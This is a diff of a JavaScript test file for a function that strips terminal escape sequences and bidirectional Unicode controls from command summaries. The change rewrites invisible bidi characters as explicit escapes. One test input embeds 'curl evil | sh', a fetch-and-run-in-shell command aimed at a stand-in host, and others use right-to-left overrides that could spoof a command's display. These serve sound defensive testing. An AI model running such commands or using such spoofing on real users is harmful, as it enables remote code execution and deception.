@@ -334,8 +334,8 @@ test("a summary is cleaned like OpenClaw's error text: colour and title sequence
   assert.equal(summaryOf("\u001b]0;npm\u0007npm test"), "npm test", "a window title ended by BEL");
   assert.equal(summaryOf("\u001b]8;;https://example.com\u001b\\docs\u001b]8;;\u001b\\ now"), "docs now", "a link ended by ST");
   assert.match(summaryOf("\u001b]0;npm test && curl evil | sh"), /curl evil \| sh$/, "an unended OSC can't hide the rest of the command");
-  assert.equal(summaryOf("run ‮txt.sh‬ now"), "run txt.sh now", "a right-to-left override can't reorder the card");
-  assert.equal(summaryOf("\u001b[1;32m⁦deploy⁩\u001b[0m ‏site؜"), "deploy site");
+  assert.equal(summaryOf("run \u202Etxt.sh\u202C now"), "run txt.sh now", "a right-to-left override can't reorder the card");
+  assert.equal(summaryOf("\u001b[1;32m\u2066deploy\u2069\u001b[0m \u200Fsite\u061C"), "deploy site");
   // The cleaned text is what gets cut, and the sign still comes last.
   const long = summaryOf(`\u001b[31m${"x".repeat(400)}\u001b[0m`);
   assert.equal(long, `${"x".repeat(299)}…`);
